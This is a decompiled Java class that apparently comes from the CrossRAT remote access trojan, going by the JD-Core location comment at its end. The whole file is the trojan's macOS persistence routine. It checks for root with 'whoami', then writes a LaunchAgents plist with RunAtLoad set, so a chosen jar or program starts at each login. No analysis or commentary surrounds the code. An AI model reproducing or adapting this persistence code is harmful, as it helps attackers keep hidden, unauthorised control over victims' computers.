package b;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public final class c
  extends a
{
  public c(String paramString1, String paramString2, boolean paramBoolean)
  {
    super(paramString1, paramString2, paramBoolean);
  }
  
  private static File b()
  {
    String str = System.getProperty("user.home");
    if (((a.c.b().a() != a.c.a) && (new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root")) ? 1 : 0) != 0) {
      str = "";
    }
    return new File(str + "/Library/LaunchAgents/");
  }
  
  public final void a()
  {
    if (!b().exists()) {
      b().mkdirs();
    }
    Object localObject = new File(b(), this.b + ".plist");
    (localObject = new PrintWriter(new FileWriter((File)localObject))).println("<plist version=\"1.0\">");
    ((PrintWriter)localObject).println("<dict>");
    ((PrintWriter)localObject).println("\t<key>Label</key>");
    ((PrintWriter)localObject).println("\t<string>" + this.b + "</string>");
    ((PrintWriter)localObject).println("\t<key>ProgramArguments</key>");
    ((PrintWriter)localObject).println("\t<array>");
    if (this.a)
    {
      ((PrintWriter)localObject).println("\t\t<string>java</string>");
      ((PrintWriter)localObject).println("\t\t<string>-jar</string>");
    }
    ((PrintWriter)localObject).println("\t\t<string>" + this.c + "</string>");
    ((PrintWriter)localObject).println("\t</array>");
    ((PrintWriter)localObject).println("\t<key>RunAtLoad</key>");
    ((PrintWriter)localObject).println("\t<true/>");
    ((PrintWriter)localObject).println("</dict>");
    ((PrintWriter)localObject).println("</plist>");
    ((PrintWriter)localObject).close();
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\b\c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */